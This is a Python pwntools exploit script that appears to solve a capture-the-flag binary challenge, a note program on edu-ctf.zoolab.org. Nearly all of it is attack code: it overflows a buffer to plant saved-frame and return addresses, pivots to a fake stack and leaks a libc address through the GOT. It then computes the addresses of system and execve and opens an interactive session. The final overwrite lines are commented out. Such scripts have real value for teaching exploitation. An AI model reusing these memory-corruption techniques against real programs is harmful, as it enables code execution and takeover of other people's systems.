from pwn import *

r = process('./chal/chal')
#r = remote('localhost',9000)
#r = remote('edu-ctf.zoolab.org','10019')
def write_note(data):
    r.sendlineafter(b'Exit\n',b'1')
    r.sendlineafter(b'Content:\n',data)

def read_note():
    r.sendlineafter(b'Exit\n',b'2')

def write_address(addr):
    prefix = b'a' * 0x90
    for j in range(len(addr)-1, -1, -1):
        a = addr[j]
        for i in range(len(a)-1, -1 , -1) :
            payload = prefix + b'b' * (0x8 * i) + b'j' * (0x190 * j) + p64(a[i])[:7]
            write_note(payload)


fake_stack = 0x404500
write_addr = 0x401617
write_scanf = 0x401598
printf_addr = 0x40167e
pop_rbp_ret = 0x40127d
printf_got = 0x404048


open_got = 0x404090
write_got = 0x404030
read_plt = 0x4010d6
#######  rbp             ret 
addr = [[printf_got+0x100, printf_addr],[fake_stack,write_scanf], [write_got+0x88, write_scanf]]


write_address(addr)
#input()
r.sendlineafter(b'Exit\n',b'4')
r.recvuntil(b'Content:\n')
libc_base = u64(r.recv(6) + b'\x00\x00') - 0x60770
print(hex(libc_base))

system = libc_base + 0x50d60
execve = libc_base + 0xeb0f0

r.sendlineafter(b'Exit\n',b'4')



# r.sendlineafter(b'Exit\n',b'4')
# r.sendline(b'a' * 8 + p64(execve)[:7]) # write
# r.sendlineafter(b'Exit\n',b'4')
#r.sendline(payload)
r.interactive()